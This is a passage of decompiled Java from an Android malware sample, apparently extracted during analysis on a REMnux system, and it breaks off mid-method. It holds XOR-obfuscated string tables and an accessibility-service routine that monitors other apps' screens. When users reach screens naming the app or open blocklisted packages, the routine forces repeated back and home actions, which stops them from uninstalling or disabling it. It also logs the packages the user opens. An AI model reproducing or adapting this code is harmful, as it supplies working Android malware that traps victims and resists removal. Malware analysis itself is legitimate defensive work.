package com.zjxyxnvvp.nxvxchltf.util;

import android.accessibilityservice.AccessibilityService;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import com.zjxyxnvvp.nxvxchltf.i.q;
import com.zjxyxnvvp.nxvxchltf.j.b;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class a {
    public static long c;
    public static long d;
    public static long h;
    private static String i;
    public static boolean j;
    private static short[] $ = {4961, 4973, 4975, 4908, 4963, 4980, 4963, 4977, 4982, 4908, 4963, 4972, 4966, 4976, 4973, 4971, 4966, 4908, 4975, 4973, 4960, 4971, 4974, 4967, 4977, 4967, 4961, 4983, 4976, 4971, 4982, 4987, 11944, 11940, 11942, 12005, 11943, 11948, 11950, 12005, 11963, 11939, 11940, 11941, 11950, 11942, 11946, 11941, 11946, 11948, 11950, 11942, 11950, 11941, 11967, 4394, 4390, 4388, 4455, 4392, 4391, 4397, 4411, 4390, 4384, 4397, 4455, 4410, 4396, 4413, 4413, 4384, 4391, 4398, 4410, 4392, 4394, 4394, 4396, 4410, 4410, 4384, 4395, 4384, 4389, 4384, 4413, 4400, 1506, 1518, 1516, 1455, 1506, 1518, 1517, 1518, 1523, 1518, 1522, 1455, 1521, 1513, 1518, 1519, 1508, 1516, 1504, 1519, 1504, 1510, 1508, 1523, 1915, 1911, 1909, 1846, 1915, 1911, 1908, 1911, 1898, 1911, 1899, 1846, 1911, 1896, 1896, 1911, 1919, 1901, 1913, 1898, 1916, 1917, 1908, 1918, 2258, 2270, 2268, 2207, 2258, 2270, 2269, 2270, 2243, 2270, 2242, 2207, 2242, 2256, 2263, 2260, 2258, 2260, 2271, 2245, 2260, 2243, 10767, 10755, 10753, 10818, 10767, 10755, 10752, 10755, 10782, 10755, 10783, 10818, 10783, 10761, 10767, 10777, 10782, 10757, 10776, 10773, 10780, 10761, 10782, 10753, 10757, 10783, 10783, 10757, 10755, 10754, 1101, 1089, 1091, 1024, 1093, 1091, 1117, 1024, 1096, 1116, 1099, 1099, 7494, 7498, 7496, 7435, 7506, 7510, 7492, 7499, 7489, 7511, 7498, 7500, 7489, 7435, 7510, 7504, 7500, 7505, 7488, 3452, 3440, 3442, 3377, 3436, 3439, 3443, 3450, 3441, 3451, 3454, 3439, 3439, 3436, 3377, 3436, 3447, 3454, 3437, 3444, 3158, 3162, 3160, 3099, 3167, 3136, 3160, 3162, 3159, 3164, 3161, 3152, 3099, 3160, 3156, 3163, 3156, 3154, 3152, 3143, 3099, 3142, 3148, 3142, 3137, 3152, 3160, 3156, 3141, 3141, 3676, 3664, 3666, 3601, 3659, 3674, 3676, 3671, 3665, 3664, 3672, 3670, 3676, 3601, 3660, 3654, 3660, 3659, 3674, 3666, 3678, 3663, 3663, 3661, 3674, 3666, 3664, 3657, 3674, 3661, 6765, 6753, 6755, 6688, 6760, 6779, 6752, 6752, 6775, 6765, 6767, 6778, 6688, 6776, 6759, 6780, 6779, 6781, 6778, 6753, 6778, 6767, 6754, 6729, 6725, 6727, 6660, 6731, 6746, 6746, 6745, 6723, 6724, 6724, 6725, 6748, 6731, 6660, 6731, 6724, 6734, 6744, 6725, 6723, 6734, 6660, 6721, 6735, 6735, 6746, 6729, 6726, 6735, 6731, 6724, 6080, 6092, 6094, 6029, 6097, 6091, 6106, 6103, 6091, 6094, 6029, 6091, 6086, 6107, 6090, 6096, 6086, 6029, 6102, 6093, 6090, 6093, 6096, 6103, 12287, 12275, 12273, 12210, 12273, 12277, 12265, 12277, 12210, 12287, 12272, 12281, 12285, 12274, 12273, 12285, 12271, 12264, 12281, 12270, 2398, 2386, 2384, 2323, 2398, 2385, 2392, 2396, 2387, 2377, 2392, 2396, 2384, 2323, 2386, 2387, 2392, 2382, 2392, 2398, 2376, 2383, 2388, 2377, 2372, 6486, 6490, 6488, 6427, 6467, 6470, 6471, 6480, 6467, 6490, 6482, 6471, 6490, 6464, 6469, 6427, 6471, 6480, 6467, 6490, 6484, 6469, 6469, 6469, 6480, 6471, 6488, 6492, 6470, 6470, 6492, 6490, 6491, 6470, 6315, 6326, 6307, 6378, 6313, 6309, 6312, 6323, 6309, 6326, 6305, 6310, 6333, 6320, 6305, 6327, 6378, 6309, 6314, 6320, 6317, 6313, 6309, 6312, 6323, 6309, 6326, 6305, 2929, 2941, 2943, 2876, 2918, 2912, 2931, 2940, 2913, 2913, 2939, 2941, 2940, 2876, 2914, 2938, 2941, 2940, 2935, 2943, 2931, 2913, 2918, 2935, 2912, 833, 845, 847, 780, 849, 835, 847, 849, 855, 844, 837, 780, 835, 833, 833, 839, 849, 849, 843, 832, 843, 846, 843, 854, 859, 3140, 3144, 3146, 3081, 3140, 3147, 3138, 3142, 3145, 3155, 3138, 3142, 3146, 3081, 3144, 3145, 3138, 3141, 3144, 3144, 3156, 3155, 4220, 4208, 4210, 4145, 4218, 4204, 4218, 4203, 4145, 4218, 4210, 4204, 4141, 4145, 4216, 4207, 3966, 3954, 3952, 3891, 3953, 3954, 3954, 3958, 3954, 3944, 3945, 311, 315, 313, 378, 309, 290, 317, 294, 309, 378, 309, 314, 304, 294, 315, 317, 304, 6418, 6421, 6407, 6400, 6490, 6404, 6428, 6427, 6426, 6417, 6490, 6423, 6424, 6417, 6421, 6426, 8078, 8066, 8064, 8131, 8076, 8065, 8093, 8069, 8076, 8068, 8067, 8091, 8072, 8067, 8089, 8066, 8095, 8131, 8075, 8068, 8065, 8072, 8064, 8076, 8067, 8076, 8074, 8072, 8095, 8075, 4294, 4303, 4310, 4242, 4317, 4306, 4312, 4302, 4307, 4309, 4312, 4242, 4303, 4293, 4303, 4296, 4313, 4305, 4317, 4300, 4300, 4302, 4313, 4305, 4307, 4298, 4313, 4302, 1598, 1586, 1584, 1651, 1599, 1588, 1577, 1593, 1592, 1595, 1592, 1587, 1593, 1592, 1583, 1651, 1582, 1592, 1598, 1576, 1583, 1588, 1577, 1572, 7473, 7485, 7487, 7548, 7478, 7456, 7461, 7479, 7472, 5252, 5256, 5258, 5321, 5268, 5254, 5258, 5268, 5266, 5257, 5248, 5321, 5254, 5257, 5251, 5269, 5256, 5262, 5251, 5321, 5259, 5256, 5256, 5259, 5070, 5058, 5056, 4995, 5086, 5068, 5056, 5086, 5080, 5059, 5066, 4995, 5068, 5059, 5065, 5087, 5058, 5060, 5065, 4995, 5086, 5056, 4995, 5086, 5070, 5058, 5087, 5064, 4995, 5080, 5060, 4995, 5118, 5070, 5058, 5087, 5064, 5103, 5058, 5068, 5087, 5065, 5100, 5070, 5081, 5060, 5083, 5060, 5081, 5076, 773, 777, 779, 840, 789, 775, 779, 789, 787, 776, 769, 840, 775, 776, 770, 788, 777, 783, 770, 840, 789, 779, 840, 787, 783, 840, 789, 773, 777, 788, 771, 772, 777, 775, 788, 770, 840, 821, 773, 777, 788, 771, 804, 777, 775, 788, 770, 807, 773, 786, 783, 784, 783, 786, 799, 3204, 3208, 3210, 3273, 3220, 3206, 3210, 3220, 3218, 3209, 3200, 3273, 3206, 3209, 3203, 3221, 3208, 3214, 3203, 3273, 3220, 3210, 3273, 3218, 3214, 3273, 3205, 3206, 3219, 3219, 3202, 3221, 3230, 3273, 3237, 3206, 3219, 3219, 3202, 3221, 3230, 3238, 3204, 3219, 3214, 3217, 3214, 3219, 3230, 5079, 5083, 5081, 5018, 5077, 5082, 5072, 5062, 5083, 5085, 5072, 5018, 5063, 5069, 5063, 5056, 5073, 5081, 5057, 5085, 5018, 5075, 5080, 5083, 5078, 5077, 5080, 5077, 5079, 5056, 5085, 5083, 5082, 5063, 5018, 5107, 5080, 5083, 5078, 5077, 5080, 5109, 5079, 5056, 5085, 5083, 5082, 5063, 5104, 5085, 5077, 5080, 5083, 5075, 5008, 5109, 5079, 5056, 5085, 5083, 5082, 5063, 5104, 5085, 5077, 5080, 5083, 5075, 4669, 4657, 4659, 4720, 4671, 4656, 4666, 4652, 4657, 4663, 4666, 4720, 4653, 4667, 4650, 4650, 4663, 4656, 4665, 4653, 4720, 4621, 4667, 4650, 4650, 4663, 4656, 4665, 4653, 4730, 4622, 4657, 4649, 4667, 4652, 4619, 4653, 4671, 4665, 4667, 4621, 4651, 4659, 4659, 4671, 4652, 
    4647, 4639, 4669, 4650, 4663, 4648, 4663, 4650, 4647, 11767, 11771, 11769, 11706, 11765, 11770, 11760, 11750, 11771, 11773, 11760, 11706, 11751, 11761, 11744, 11744, 11773, 11770, 11763, 11751, 11706, 11719, 11761, 11744, 11744, 11773, 11770, 11763, 11751, 11696, 11733, 11767, 11767, 11761, 11751, 11751, 11773, 11766, 11773, 11768, 11773, 11744, 11757, 11719, 11761, 11744, 11744, 11773, 11770, 11763, 11751, 11733, 11767, 11744, 11773, 11746, 11773, 11744, 11757, 11005, 10993, 10995, 10928, 11007, 10992, 11002, 10988, 10993, 10999, 11002, 10928, 10989, 11003, 10986, 10986, 10999, 10992, 11001, 10989, 10928, 11007, 10990, 10990, 10994, 10999, 11005, 11007, 10986, 10999, 10993, 10992, 10989, 10928, 10967, 10992, 10989, 10986, 11007, 10994, 10994, 11003, 11002, 10975, 10990, 10990, 10970, 11003, 10986, 11007, 10999, 10994, 10989, 10954, 10993, 10990, 3796, 3800, 3802, 3737, 3802, 3806, 3778, 3806, 3737, 3798, 3783, 3783, 3802, 3798, 3801, 3798, 3792, 3794, 3781, 3737, 3830, 3783, 3783, 3803, 3806, 3796, 3798, 3779, 3806, 3800, 3801, 3780, 3827, 3794, 3779, 3798, 3806, 3803, 3780, 3830, 3796, 3779, 3806, 3777, 3806, 3779, 3790, 1708, 1696, 1698, 1761, 1698, 1702, 1722, 1702, 1761, 1727, 1696, 1720, 1706, 1725, 1708, 1706, 1697, 1723, 1706, 1725, 1761, 1695, 1696, 1720, 1706, 1725, 1666, 1710, 1702, 1697, 1678, 1708, 1723, 1702, 1721, 1702, 1723, 1718, 3908, 3912, 3914, 3849, 3924, 3910, 3914, 3924, 3922, 3913, 3904, 3849, 3910, 3913, 3907, 3925, 3912, 3918, 3907, 3849, 3924, 3914, 3849, 3909, 3910, 3923, 3923, 3906, 3925, 3934, 3849, 3922, 3918, 3849, 3941, 3910, 3923, 3923, 3906, 3925, 3934, 3942, 3908, 3923, 3918, 3921, 3918, 3923, 3934, 1333, 1337, 1339, 1400, 1342, 1315, 1335, 1313, 1331, 1343, 1400, 1317, 1327, 1317, 1314, 1331, 1339, 1339, 1335, 1336, 1335, 1329, 1331, 1316, 1431, 1435, 1433, 1498, 1426, 1429, 1431, 1425, 1430, 1435, 1435, 1439, 1498, 1439, 1429, 1408, 1429, 1434, 1429, 6216, 6212, 6214, 6149, 6232, 6222, 6216, 6149, 6218, 6213, 6223, 6233, 6212, 6210, 6223, 6149, 6218, 6235, 6235, 6149, 6232, 6217, 6233, 6212, 6236, 6232, 6222, 6233, 2923, 2919, 2917, 2854, 2921, 2918, 2924, 2938, 2919, 2913, 2924, 2854, 2923, 2912, 2938, 2919, 2917, 2925, 512, 524, 526, 589, 532, 523, 514, 535, 528, 514, 531, 531, 12032, 12044, 12046, 12109, 12036, 12044, 12044, 12036, 12047, 12038, 12109, 12034, 12045, 12039, 12049, 12044, 12042, 12039, 12109, 12036, 12044, 12044, 12036, 12047, 12038, 12050, 12054, 12042, 12032, 12040, 12048, 12038, 12034, 12049, 12032, 12043, 12033, 12044, 12059, 1149, 1137, 1139, 1072, 1145, 1137, 1137, 1145, 1138, 1147, 1072, 1151, 1136, 1146, 1132, 1137, 1143, 1146, 1072, 1127, 1137, 1131, 1130, 1131, 1148, 1147, 627, 639, 637, 574, 612, 615, 633, 612, 612, 629, 610, 574, 625, 638, 628, 610, 639, 633, 628, 3373, 3361, 3363, 3424, 3375, 3360, 3370, 3388, 3361, 3367, 3370, 3424, 3389, 3371, 3386, 3386, 3367, 3360, 3369, 3389, 9204, 9208, 9210, 9145, 9206, 9209, 9203, 9189, 9208, 9214, 9203, 9145, 9191, 9206, 9204, 9212, 9206, 9200, 9202, 9214, 9209, 9188, 9187, 9206, 9211, 9211, 9202, 9189, 0, 12, 14, 77, 4, 12, 12, 4, 15, 6, 77, 2, 13, 7, 17, 12, 10, 7, 77, 19, 2, 0, 8, 2, 4, 6, 10, 13, 16, 23, 2, 15, 15, 6, 17, 260, 267, 257, 279, 266, 268, 257, 331, 260, 277, 277, 331, 292, 265, 256, 279, 273, 289, 268, 260, 265, 266, 258, 812, 800, 802, 865, 807, 826, 814, 824, 810, 806, 865, 828, 822, 828, 827, 810, 802, 802, 814, 801, 814, 808, 810, 829, 103, 86, 75, 71, 101, 90, 86, 68, 3069, 3014, 3039, 3031, 3036, 3027, 2962, 3015, 3030, 3027, 3038, 3031, 3036, 3035, 3019, 3027, 2962, 3049, 4939, 4918, 8190, 8329, 8325, 8327, 8388, 8350, 8325, 8351, 8329, 8322, 8350, 8339, 8346, 8335, 8388, 8345, 8349, 8323, 8332, 8350, 8321, 8335, 8339, 6506, 6501, 6511, 6521, 6500, 6498, 6511, 6437, 1960, 1956, 1958, 2021, 1960, 1956, 1959, 1956, 1977, 1956, 1976, 2021, 43, 106, 117, 117, 106, 43, 2864, 2868, 2856, 2868, 73, 84, 64, 86, 68, 72, 1894, 1904, 1889, 1889, 1916, 1915, 1906, 1894, 8460, 8498, 8506, 8497, 8510, 8575, 8496, 8491, 8500, 8493, 8502, 8491, 8496, 8504, 8496, 8575, 8510, 8495, 8500, 8575, 8497, 8510, 8575, 6286, 6300, 6288, 6286, 6280, 6291, 6298, 6880, 6850, 6869, 6854, 6869, 6878, 6852, 6869, 6868, 6800, 6851, 6865, 6877, 6851, 6853, 6878, 6871, 6800, 6848, 6879, 6855, 6869, 6850, 6800, 6879, 6870, 6870, 2310, 2314, 2312, 2379, 2326, 2308, 2312, 2326, 2320, 2315, 2306, 2379, 2308, 2315, 2305, 2327, 2314, 2316, 2305, 2379, 2306, 2313, 2314, 2311, 2308, 2313, 2308, 2310, 2321, 2316, 2314, 2315, 2326, 2379, 2325, 2327, 2304, 2326, 2304, 2315, 2321, 2308, 2321, 2316, 2314, 2315, 2379, 2323, 2316, 2304, 2322, 2379, 2358, 2304, 2310, 2338, 2313, 2314, 2311, 2308, 2313, 2340, 2310, 2321, 2316, 2314, 2315, 2326, 2337, 2316, 2308, 2313, 2314, 2306, 2343, 2308, 2326, 2304, 2369, 2340, 2310, 2321, 2316, 2314, 2315, 2326, 2337, 2316, 2308, 2313, 2314, 2306, 6469, 6473, 6475, 6408, 6485, 6471, 6475, 6485, 6483, 6472, 6465, 6408, 6471, 6472, 6466, 6484, 6473, 6479, 6466, 6408, 6465, 6474, 6473, 6468, 6471, 6474, 6471, 6469, 6482, 6479, 6473, 6472, 6485, 6408, 6486, 6484, 6467, 6485, 6467, 6472, 6482, 6471, 6482, 6479, 6473, 6472, 6408, 6480, 6479, 6467, 6481, 6408, 6517, 6471, 6475, 6485, 6483, 6472, 6465, 6497, 6474, 6473, 6468, 6471, 6474, 6503, 6469, 6482, 6479, 6473, 6472, 6485, 6498, 6479, 6471, 6474, 6473, 6465, 6500, 6471, 6485, 6467, 6402, 6503, 6469, 6482, 6479, 6473, 6472, 6485, 6498, 6479, 6471, 6474, 6473, 6465, 8721, 8734, 8724, 8706, 8735, 8729, 8724, 8728, 8711, 8725, 8712, 8708, 8778, 8729, 8724, 8799, 8728, 8711, 8751, 8734, 8725, 8711, 8751, 8727, 8732, 8735, 8722, 8721, 8732, 8751, 8721, 8723, 8708, 8729, 8735, 8734, 8707, 8751, 8710, 8729, 8725, 8711, 8821, 8791, 8768, 8787, 8768, 8779, 8785, 8768, 8769, 8709, 8781, 8784, 8772, 8786, 8768, 8780, 8709, 8789, 8778, 8786, 8768, 8791, 8709, 8778, 8771, 8771, 8484, 8495, 8493, 169, 165, 167, 228, 166, 173, 175, 240, 163, 174, 229, 173, 166, 165, 168, 171, 
    166, 149, 171, 169, 190, 163, 165, 164, 185, 149, 163, 190, 175, 167, 149, 163, 167, 171, 173, 175, 168, 191, 190, 190, 165, 164, 149, 164, 165, 184, 167, 171, 166, 3064, 3034, 3021, 3038, 3021, 3014, 3036, 3021, 3020, 2952, 3012, 3023, 3021, 2952, 3032, 3015, 3039, 3021, 3034, 2952, 3015, 3022, 3022, 1164, 1155, 1177, 1156, 1179, 1156, 1183, 1176, 1182, 9360, 9375, 9366, 9362, 9373, 9366, 9345, 3940, 3967, 3960, 3967, 3938, 3941, 3952, 3965, 3965, 2919, 2894, 2890, 2909, 2894, 2827, 3497, 3508, 3488, 3510, 3492, 3496, 1536, 1570, 1589, 1574, 1589, 1598, 1572, 1589, 1588, 1648, 1592, 1599, 1596, 1588, 1593, 1598, 1591, 1648, 1570, 1589, 1585, 1596, 1648, 1585, 1568, 1568, 1648, 1593, 1587, 1599, 1598, 317, 295, 317, 7864, 7860, 7862, 7925, 7859, 7854, 7866, 7852, 7870, 7858, 7925, 7848, 7842, 7848, 7855, 7870, 7862, 7862, 7866, 7861, 7866, 7868, 7870, 7849, 7275, 7241, 7238, 7243, 7245, 7236, 7176, 7243, 7236, 7233, 7243, 7235, 7233, 7238, 7247, 7176, 7239, 7238, 7176, 7241, 7256, 7256, 7176, 7236, 7241, 7242, 7245, 7236, 1190, 1156, 1163, 1158, 1152, 1161, 1221, 1158, 1161, 1164, 1158, 1166, 1164, 1163, 1154, 1221, 1162, 1163, 1221, 1155, 1156, 1158, 1169, 1162, 1175, 1180, 1221, 1175, 1152, 1174, 1152, 1169, 1221, 3396, 3430, 3433, 3428, 3426, 3435, 3367, 3428, 3435, 3438, 3428, 3436, 3438, 3433, 3424, 3367, 3425, 3432, 3445, 3428, 3426, 3367, 3444, 3443, 3432, 3447, 3172, 3142, 3145, 3140, 3138, 3147, 3079, 3140, 3147, 3150, 3140, 3148, 3150, 3145, 3136, 3079, 3154, 3145, 3150, 3145, 3156, 3155, 3142, 3147, 3147, 1385, 1397, 1400, 1376, 1337, 1385, 1387, 1398, 1389, 1404, 1402, 1389, 6745, 6779, 6772, 6777, 6783, 6774, 6714, 6777, 6774, 6771, 6777, 6769, 6771, 6772, 6781, 6714, 6762, 6774, 6779, 6755, 6714, 6762, 6760, 6773, 6766, 6783, 6777, 6766, 9454, 9442, 9440, 9379, 9452, 9443, 9449, 9471, 9442, 9444, 9449, 9379, 9470, 9448, 9465, 9465, 9444, 9443, 9450, 9470, 9379, 9438, 9464, 9455, 9438, 9448, 9465, 9465, 9444, 9443, 9450, 9470, 1485, 1519, 1504, 1517, 1515, 1506, 1454, 1505, 1534, 1515, 1504, 1511, 1504, 1513, 1454, 1533, 1531, 1516, 1533, 1515, 1530, 1530, 1511, 1504, 1513, 1533, 1454, 1529, 1511, 1530, 1510, 1454, 1519, 1534, 1534, 1454, 1504, 1519, 1507, 1515, 7155, 7112, 7121, 7129, 7122, 7133, 7068, 7123, 7112, 7127, 7118, 7125, 7112, 7125, 7109, 7133, 7068, 7123, 7116, 7133, 7119, 7122, 7123, 7131, 7123, 7068, 7114, 7125, 7129, 7115, 7068, 9598, 9586, 9584, 9523, 9584, 9588, 9576, 9588, 9523, 9589, 9586, 9584, 9592, 9043, 9047, 9035, 9047, 8976, 9055, 9038, 9038, 8976, 9087, 9042, 9051, 9036, 9034, 9082, 9047, 9055, 9042, 9041, 9049, 1386, 1352, 1375, 1356, 1375, 1364, 1358, 1375, 1374, 1306, 1346, 1363, 1371, 1365, 1367, 1363, 1306, 1371, 1354, 1354, 1306, 1374, 1375, 1366, 1375, 1358, 1363, 1365, 1364, 5874, 5886, 5884, 5823, 5872, 5887, 5877, 5859, 5886, 5880, 5877, 5823, 5858, 5876, 5861, 5861, 5880, 5887, 5878, 5858, 8012, 8000, 8002, 7937, 8028, 8010, 8012, 7937, 8014, 8001, 8011, 8029, 8000, 8006, 8011, 7937, 8014, 8031, 8031, 7937, 8003, 8014, 8026, 8001, 8012, 8007, 8010, 8029, 4921, 4917, 4919, 4980, 4925, 4917, 4917, 4925, 4918, 4927, 4980, 4923, 4916, 4926, 4904, 4917, 4915, 4926, 4980, 4923, 4906, 4906, 4905, 9165, 9199, 9208, 9195, 9208, 9203, 9193, 9208, 9209, 9149, 9202, 9197, 9208, 9203, 9204, 9203, 9210, 9149, 9198, 9208, 9193, 9193, 9204, 9203, 9210, 9149, 9193, 9212, 9215, 9149, 9194, 9204, 9193, 9205, 9149, 9212, 9197, 9197, 9149, 9203, 9212, 9200, 9208};

    /* renamed from: a */
    private static final Set<String> f358a = new HashSet();

    /* renamed from: b */
    private static final Set<String> f359b = new HashSet();
    private static final Set<String> e = new HashSet();
    private static final Set<String> f = new HashSet();
    private static final Set<String> g = new HashSet();

    /* renamed from: com.zjxyxnvvp.nxvxchltf.util.a$a */
    /* loaded from: /home/remnux/decompressedMalicious.dex */
    public class RunnableC0007a implements Runnable {

        /* renamed from: a */
        final /* synthetic */ AccessibilityService f360a;

        RunnableC0007a(AccessibilityService accessibilityService) {
            this.f360a = accessibilityService;
        }

        @Override // java.lang.Runnable
        public void run() {
            this.f360a.performGlobalAction(8);
        }
    }

    private static String $(int i2, int i3, int i4) {
        char[] cArr = new char[i3 - i2];
        for (int i5 = 0; i5 < i3 - i2; i5++) {
            cArr[i5] = (char) ($[i2 + i5] ^ i4);
        }
        return new String(cArr);
    }

    static {
        f358a.add($(0, 32, 4866));
        f358a.add($(32, 55, 11979));
        f358a.add($(55, 88, 4425));
        f358a.add($(88, 112, 1409));
        f358a.add($(112, 136, 1816));
        f358a.add($(136, 158, 2225));
        f358a.add($(158, 188, 10860));
        f358a.add($(188, 200, 1070));
        f358a.add($(200, 219, 7461));
        f358a.add($(219, 239, 3359));
        f358a.add($(239, 269, 3125));
        f358a.add($(269, 299, 3647));
        f358a.add($(299, 322, 6670));
        f358a.add($(322, 354, 6698));
        f358a.add($(354, 378, 6051));
        f358a.add($(378, 398, 12188));
        f358a.add($(398, 423, 2365));
        f358a.add($(423, 457, 6453));
        f358a.add($(457, 485, 6340));
        f358a.add($(485, 510, 2834));
        f358a.add($(510, 535, 802));
        f358a.add($(535, 557, 3111));
        f358a.add($(557, 573, 4127));
        f358a.add($(573, 584, 3869));
        f358a.add($(584, 601, 340));
        f358a.add($(601, 617, 6516));
        f358a.add($(617, 647, 8173));
        f358a.add($(647, 675, 4284));
        f358a.add($(675, 699, 1629));
        f358a.add($(699, 708, 7506));
        f358a.add($(708, 732, 5351));
        e.add($(732, 782, 5037));
        e.add($(782, 837, 870));
        e.add($(837, 886, 3303));
        e.add($(886, 954, 5044));
        e.add($(954, 1009, 4702));
        e.add($(1009, 1068, 11668));
        e.add($(1068, 1124, 10910));
        e.add($(1124, 1171, 3767));
        e.add($(1171, 1209, 1743));
        f.add($(1209, 1258, 3879));
        f359b.add($(1258, 1282, 1366));
        g.add($(1282, 1301, 1524));
        g.add($(1301, 1329, 6187));
        g.add($(1329, 1347, 2824));
        g.add($(1347, 1359, 611));
        g.add($(1359, 1398, 12131));
        g.add($(1398, 1424, 1054));
        g.add($(1424, 1443, 528));
    }

    public static boolean a(AccessibilityService accessibilityService, AccessibilityEvent accessibilityEvent) {
        CharSequence className = accessibilityEvent.getClassName();
        CharSequence packageName = accessibilityEvent.getPackageName();
        String lowerCase = b.l(accessibilityService).toLowerCase();
        String $2 = $(1443, 1463, 3406);
        String $3 = $(1463, 1491, 9111);
        String $4 = $(1491, 1526, 99);
        if (packageName != null && (packageName.equals($4) || packageName.equals($2) || packageName.equals($3) || (className != null && className.equals($(1526, 1549, 357))))) {
            if (packageName.equals($(1549, 1573, 847))) {
                return false;
            }
            AccessibilityNodeInfo accessibilityNodeInfo = UIDNwaidobaWIODb.i;
            List<CharSequence> text = accessibilityEvent.getText();
            if (text == null) {
                return false;
            }
            StringBuilder sb = new StringBuilder();
            for (CharSequence charSequence : text) {
                sb.append(charSequence.toString());
            }
            boolean z = System.currentTimeMillis() < d;
            if (z && (packageName.equals($4) || packageName.equals($3))) {
                for (AccessibilityNodeInfo accessibilityNodeInfo2 : b.b(accessibilityNodeInfo, $(1573, 1581, 51))) {
                    if (!(accessibilityNodeInfo2 == null || accessibilityNodeInfo2.getText() == null)) {
                        sb.append(accessibilityNodeInfo2.getText());
                    }
                }
            }
            String lowerCase2 = sb.toString().toLowerCase();
            if (z && (lowerCase2.contains(g.f()) || lowerCase2.contains(g.b()) || lowerCase2.contains(g.c()) || lowerCase2.contains(g.d()) || lowerCase2.contains(g.h()) || lowerCase2.contains(g.g()) || lowerCase2.contains(g.a()))) {
                return false;
            }
            if (lowerCase2.contains(lowerCase)) {
                accessibilityService.performGlobalAction(1);
                accessibilityService.performGlobalAction(1);
                accessibilityService.performGlobalAction(1);
                accessibilityService.performGlobalAction(1);
                if (Build.VERSION.SDK_INT >= 28) {
                    new Handler(Looper.getMainLooper()).postDelayed(new RunnableC0007a(accessibilityService), 250);
                }
                e.a($(1581, 1599, 2994) + lowerCase2 + $(1599, 1601, 4886) + ((Object) accessibilityEvent.getPackageName()) + $(1601, 1602, 8132) + ((Object) accessibilityEvent.getClassName()));
                return true;
            }
        }
        if (packageName != null && b.e) {
            String charSequence2 = packageName.toString();
            if (!packageName.equals($4) && !packageName.equals($3) && !packageName.equals($2) && !packageName.equals($(1602, 1624, 8426)) && !charSequence2.contains($(1624, 1632, 6411)) && !charSequence2.contains($(1632, 1644, 1995)) && !charSequence2.contains($(1644, 1650, 5)) && !charSequence2.contains($(1650, 1654, 2909)) && !charSequence2.contains($(1654, 1660, 33)) && !charSequence2.contains($(1660, 1668, 1813))) {
                String str = i;
                if (str == null) {
                    i = packageName.toString();
                } else if (!str.equals(packageName.toString())) {
                    i = packageName.toString();
                    e.a($(1668, 1691, 8543) + i);
                }
            }
        }
        return false;
    }

    public static boolean b(AccessibilityService accessibilityService, AccessibilityEvent accessibilityEvent) {
        long currentTimeMillis = System.currentTimeMillis();
        if (currentTimeMillis < h) {
            return false;
        }
        List<CharSequence> text = accessibilityEvent.getText();
        CharSequence className = accessibilityEvent.getClassName();
        CharSequence packageName = accessibilityEvent.getPackageName();
        String lowerCase = b.l(accessibilityService).toLowerCase();
        if (packageName != null && g.contains(packageName.toString())) {
            return false;
        }
        AccessibilityNodeInfo accessibilityNodeInfo = UIDNwaidobaWIODb.i;
        if (accessibilityNodeInfo != null && Build.VERSION.SDK_INT >= 28) {
            if (Build.MANUFACTURER.toLowerCase().contains($(1691, 1698, 6397))) {
                String $2 = $(1698, 1725, 6832);
                if (className != null && className.equals($(1725, 1817, 2405))) {
                    accessibilityService.performGlobalAction(8);
                    e.a($2);
                    return true;
                } else if (className != null && className.equals($(1817, 1913, 6438))) {
                    accessibilityService.performGlobalAction(8);
                    e.a($2);
                    return true;
                }
            }
            if (accessibilityNodeInfo.getViewIdResourceName() != null && accessibilityNodeInfo.getViewIdResourceName().equals($(1913, 1955, 8816))) {
                accessibilityService.performGlobalAction(8);
                e.a($(1955, 1981, 8741));
                return true;
            } else if (Build.MANUFACTURER.toLowerCase().contains($(1981, 1984, 8520)) && accessibilityNodeInfo.findAccessibilityNodeInfosByViewId($(1984, 2033, 202)).size() > 0) {
                accessibilityService.performGlobalAction(8);
                e.a($(2033, 2056, 2984));
                return true;
            }
        }
        if (packageName != null) {
            String charSequence = packageName.toString();
            if (f358a.contains(charSequence) || ((currentTimeMillis > c && f359b.contains(charSequence)) || charSequence.contains($(2056, 2065, 1261)) || charSequence.contains($(2065, 2072, 9459)) || charSequence.contains($(2072, 2081, 3857)))) {
                accessibilityService.performGlobalAction(1);
                accessibilityService.performGlobalAction(1);
                accessibilityService.performGlobalAction(1);
                accessibilityService.performGlobalAction(1);
                e.a($(2081, 2087, 2859) + ((Object) packageName));
                return true;
            }
        }
        if (accessibilityEvent.getEventType() == 2 && text != null) {
            StringBuilder sb = new StringBuilder();
            for (CharSequence charSequence2 : text) {
                sb.append(charSequence2);
            }
            if (sb.toString().toLowerCase().contains(lowerCase)) {
                accessibilityService.performGlobalAction(1);
                accessibilityService.performGlobalAction(1);
                if (Build.MANUFACTURER.toLowerCase().contains($(2087, 2093, 3521))) {
                    accessibilityService.performGlobalAction(2);
                } else {
                    accessibilityService.performGlobalAction(1);
                }
                e.a($(2093, 2124, 1616));
                return true;
            }
        }
        if (text != null && !text.isEmpty()) {
            CharSequence charSequence3 = text.get(0);
            int eventType = accessibilityEvent.getEventType();
            String $3 = $(2124, 2127, 285);
            if (eventType == 1 && charSequence3 != null && packageName != null && !packageName.equals($(2127, 2151, 7899))) {
                String lowerCase2 = charSequence3.toString().toLowerCase();
                if (lowerCase2.contains(lowerCase)) {
                    accessibilityService.performGlobalAction(1);
                    accessibilityService.performGlobalAction(1);
                    accessibilityService.performGlobalAction(2);
                    e.a($(2151, 2179, 7208));
                    return true;
                } else if (lowerCase2.contains(g.i())) {
                    accessibilityService.performGlobalAction(1);
                    accessibilityService.performGlobalAction(1);
                    accessibilityService.performGlobalAction(1);
                    accessibilityService.performGlobalAction(2);
                    e.a($(2179, 2212, 1253) + ((Object) accessibilityEvent.getPackageName()) + $3 + ((Object) accessibilityEvent.getClassName()));
                    return true;
                } else if (lowerCase2.contains(g.j())) {
                    accessibilityService.performGlobalAction(1);
                    accessibilityService.performGlobalAction(1);
                    accessibilityService.performGlobalAction(1);
                    accessibilityService.performGlobalAction(1);
                    e.a($(2212, 2238, 3335));
                    return true;
                } else if (lowerCase2.contains(g.n())) {
                    accessibilityService.performGlobalAction(1);
                    accessibilityService.performGlobalAction(1);
                    accessibilityService.performGlobalAction(1);
                    accessibilityService.performGlobalAction(1);
                    e.a($(2238, 2263, 3111));
                    return true;
